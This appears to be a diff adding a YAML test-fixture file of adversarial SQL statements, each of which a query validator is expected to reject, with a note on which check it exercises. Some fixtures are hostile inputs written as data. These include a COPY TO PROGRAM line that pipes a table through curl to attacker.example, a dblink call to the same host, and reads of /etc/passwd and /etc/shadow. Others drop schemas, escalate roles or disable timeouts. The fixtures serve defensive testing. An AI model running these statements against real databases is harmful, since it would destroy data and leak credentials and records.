@@ -1,0 +1,308 @@
+# Adversarial fixtures. Every case here MUST be rejected by SqlValidator.
+#
+# `why` is not decoration. It is what makes the pass/fail count mean something
+# when someone asks "so what did the 50 actually cover?" -- and it records which
+# specific check each case is exercising, so a regression tells you what broke.
+#
+# Categories: ddl, dml, stacked, cte_write, comment_evasion, function_abuse,
+#             privilege, resource_exhaustion, session_control, malformed
+
+# --- plain DDL ------------------------------------------------------------
+
+- id: ddl_drop_table
+  category: ddl
+  sql: "DROP TABLE customers"
+  why: "bare DDL; caught by the root-type allowlist"
+
+- id: ddl_drop_if_exists
+  category: ddl
+  sql: "DROP TABLE IF EXISTS customers CASCADE"
+  why: "IF EXISTS does not change the node type"
+
+- id: ddl_create_table
+  category: ddl
+  sql: "CREATE TABLE exfil (id INT)"
+  why: "creating scratch tables is a write"
+
+- id: ddl_ctas
+  category: ddl
+  sql: "CREATE TABLE exfil AS SELECT * FROM customers"
+  why: "DDL wrapping a SELECT; the SELECT does not make it read-only"
+
+- id: ddl_create_view
+  category: ddl
+  sql: "CREATE VIEW v AS SELECT * FROM orders"
+  why: "persists an object in the schema"
+
+- id: ddl_alter_table
+  category: ddl
+  sql: "ALTER TABLE customers ADD COLUMN backdoor TEXT"
+  why: "schema mutation"
+
+- id: ddl_alter_role
+  category: ddl
+  sql: "ALTER ROLE analyst_ro SUPERUSER"
+  why: "privilege escalation via ALTER"
+
+- id: ddl_truncate
+  category: ddl
+  sql: "TRUNCATE TABLE order_items"
+  why: "data destruction that is not DELETE"
+
+- id: ddl_drop_schema
+  category: ddl
+  sql: "DROP SCHEMA public CASCADE"
+  why: "the worst case; must not depend on table-name matching"
+
+- id: ddl_create_index
+  category: ddl
+  sql: "CREATE INDEX idx_x ON orders(id)"
+  why: "writes to the catalog and can lock the table"
+
+# --- plain DML ------------------------------------------------------------
+
+- id: dml_insert
+  category: dml
+  sql: "INSERT INTO customers (name, email) VALUES ('x', 'x@example.com')"
+  why: "plain INSERT"
+
+- id: dml_insert_select
+  category: dml
+  sql: "INSERT INTO exfil SELECT * FROM customers"
+  why: "INSERT whose payload is a SELECT"
+
+- id: dml_update_all
+  category: dml
+  sql: "UPDATE customers SET segment = 'enterprise'"
+  why: "unqualified UPDATE"
+
+- id: dml_update_where_true
+  category: dml
+  sql: "UPDATE customers SET segment = 'enterprise' WHERE 1=1"
+  why: "classic injection tail; the WHERE does not matter, the verb does"
+
+- id: dml_delete
+  category: dml
+  sql: "DELETE FROM orders WHERE id > 0"
+  why: "plain DELETE"
+
+- id: dml_delete_no_where
+  category: dml
+  sql: "DELETE FROM orders"
+  why: "unqualified DELETE"
+
+- id: dml_merge
+  category: dml
+  sql: "MERGE INTO customers c USING orders o ON c.id = o.customer_id WHEN MATCHED THEN DELETE"
+  why: "MERGE hides DML behind a join-shaped statement"
+
+# --- stacked statements ---------------------------------------------------
+
+- id: stacked_select_drop
+  category: stacked
+  sql: "SELECT 1; DROP TABLE customers"
+  why: "parse() returns 2 expressions; parse_one() would silently pass this"
+
+- id: stacked_select_update
+  category: stacked
+  sql: "SELECT id FROM orders; UPDATE orders SET status = 'delivered'"
+  why: "same shape, DML tail"
+
+- id: stacked_trailing_comment
+  category: stacked
+  sql: "SELECT id FROM orders; DROP TABLE orders; -- cleanup"
+  why: "a trailing comment must not hide the second statement"
+
+- id: stacked_three
+  category: stacked
+  sql: "SELECT 1; SELECT 2; SELECT 3"
+  why: "all-SELECT but still multi-statement; the count check must not special-case SELECT"
+
+# --- writes hidden inside read-shaped statements --------------------------
+
+- id: cte_delete_returning
+  category: cte_write
+  sql: "WITH d AS (DELETE FROM orders RETURNING *) SELECT * FROM d"
+  why: "valid Postgres; roots as SELECT -- only a full tree walk catches it"
+
+- id: cte_update_returning
+  category: cte_write
+  sql: "WITH u AS (UPDATE customers SET segment = 'smb' RETURNING id) SELECT * FROM u"
+  why: "same trick with UPDATE"
+
+- id: cte_insert_returning
+  category: cte_write
+  sql: "WITH i AS (INSERT INTO customers (name) VALUES ('x') RETURNING id) SELECT * FROM i"
+  why: "same trick with INSERT"
+
+- id: cte_nested_delete
+  category: cte_write
+  sql: "WITH a AS (SELECT 1), b AS (DELETE FROM orders RETURNING id) SELECT * FROM a, b"
+  why: "the write is the second CTE; walking must not stop at the first"
+
+- id: select_into_table
+  category: cte_write
+  sql: "SELECT * INTO exfil FROM customers"
+  why: "roots as SELECT and contains no forbidden keyword, yet creates a table"
+
+- id: select_into_from_join
+  category: cte_write
+  sql: "SELECT c.id INTO exfil FROM customers c JOIN orders o ON o.customer_id = c.id"
+  why: "same, buried after a join"
+
+# --- lexical evasion ------------------------------------------------------
+
+- id: comment_split_delete
+  category: comment_evasion
+  sql: "DELETE/**/FROM orders"
+  why: "a regex on '\\bDELETE\\s+FROM\\b' misses this; the tokenizer does not"
+
+- id: comment_inline_drop
+  category: comment_evasion
+  sql: "DROP/*x*/TABLE/*y*/customers"
+  why: "comments as token separators throughout"
+
+- id: newline_split_update
+  category: comment_evasion
+  sql: "UPDATE\n\n  customers\nSET segment = 'smb'"
+  why: "whitespace and newlines are not a defense boundary"
+
+- id: mixed_case_drop
+  category: comment_evasion
+  sql: "DrOp TaBlE customers"
+  why: "case folding"
+
+- id: leading_comment_block
+  category: comment_evasion
+  sql: "/* harmless analytics query */ DROP TABLE customers"
+  why: "a reassuring comment does not change the parse"
+
+# --- dangerous functions --------------------------------------------------
+
+- id: fn_query_to_xml
+  category: function_abuse
+  sql: "SELECT query_to_xml('SELECT * FROM customers', true, true, '')"
+  why: "executes a SQL string argument -- an eval hole shaped like a SELECT"
+
+- id: fn_pg_read_file
+  category: function_abuse
+  sql: "SELECT pg_read_file('/etc/passwd')"
+  why: "read-only w.r.t. the database, exfiltrates the filesystem"
+
+- id: fn_pg_ls_dir
+  category: function_abuse
+  sql: "SELECT pg_ls_dir('/var/lib/postgresql')"
+  why: "filesystem enumeration"
+
+- id: fn_lo_import
+  category: function_abuse
+  sql: "SELECT lo_import('/etc/shadow')"
+  why: "large-object filesystem read"
+
+- id: fn_dblink
+  category: function_abuse
+  sql: "SELECT * FROM dblink('host=attacker.example', 'SELECT 1') AS t(x INT)"
+  why: "outbound connection from inside the database"
+
+- id: fn_set_config
+  category: function_abuse
+  sql: "SELECT set_config('statement_timeout', '0', false)"
+  why: "disables our own timeout from inside a SELECT"
+
+- id: fn_pg_terminate_backend
+  category: function_abuse
+  sql: "SELECT pg_terminate_backend(pid) FROM pg_stat_activity"
+  why: "denial of service against other sessions, wrapped in a SELECT"
+
+- id: fn_nested_in_subquery
+  category: function_abuse
+  sql: "SELECT id FROM orders WHERE id IN (SELECT pg_sleep(10)::int)"
+  why: "the function is nested in a subquery; find_all must reach it"
+
+# --- resource exhaustion --------------------------------------------------
+
+- id: res_pg_sleep
+  category: resource_exhaustion
+  sql: "SELECT pg_sleep(300)"
+  why: "read-only but pins a connection; the row cap does not bound it"
+
+- id: res_pg_sleep_in_select_list
+  category: resource_exhaustion
+  sql: "SELECT id, pg_sleep(1) FROM orders"
+  why: "per-row sleep; LIMIT would not save us if the function were allowed"
+
+# --- privilege ------------------------------------------------------------
+
+- id: priv_grant_public
+  category: privilege
+  sql: "GRANT ALL ON customers TO PUBLIC"
+  why: "privilege escalation"
+
+- id: priv_grant_select
+  category: privilege
+  sql: "GRANT SELECT ON orders TO analyst_ro"
+  why: "even a read grant is a catalog write"
+
+- id: priv_copy_to_program
+  category: privilege
+  sql: "COPY customers TO PROGRAM 'curl -d @- https://attacker.example'"
+  why: "command execution; sqlglot models COPY explicitly"
+
+- id: priv_copy_from_file
+  category: privilege
+  sql: "COPY customers FROM '/tmp/payload.csv'"
+  why: "server-side file read into a table"
+
+# --- session / maintenance control ---------------------------------------
+
+- id: sess_set_timeout
+  category: session_control
+  sql: "SET statement_timeout = 0"
+  why: "turns off the timeout that bounds DB work"
+
+- id: sess_set_readonly_off
+  category: session_control
+  sql: "SET transaction_read_only = off"
+  why: "would undo guardrail layer 2"
+
+- id: sess_begin
+  category: session_control
+  sql: "BEGIN"
+  why: "explicit transaction control does not belong in a generated query"
+
+- id: sess_vacuum
+  category: session_control
+  sql: "VACUUM FULL customers"
+  why: "sqlglot models this as exp.Command; rejecting Command covers a class"
+
+- id: sess_refresh_matview
+  category: session_control
+  sql: "REFRESH MATERIALIZED VIEW mv_revenue"
+  why: "another Command fallback; writes data"
+
+- id: sess_reindex
+  category: session_control
+  sql: "REINDEX TABLE orders"
+  why: "maintenance command, locks the table"
+
+# --- malformed ------------------------------------------------------------
+
+- id: mal_empty
+  category: malformed
+  sql: ""
+  why: "empty input must not be treated as a harmless no-op"
+
+- id: mal_whitespace
+  category: malformed
+  sql: "   \n  "
+  why: "whitespace-only input"
+
+- id: mal_garbage
+  category: malformed
+  sql: "not sql at all (("
+  why: "unparseable input must fail closed, not fall through"
+
+- id: mal_unterminated_string
+  category: malformed
+  sql: "SELECT * FROM orders WHERE name = 'unterminated"
+  why: "a tokenizer edge case must be a rejection, not an exception"
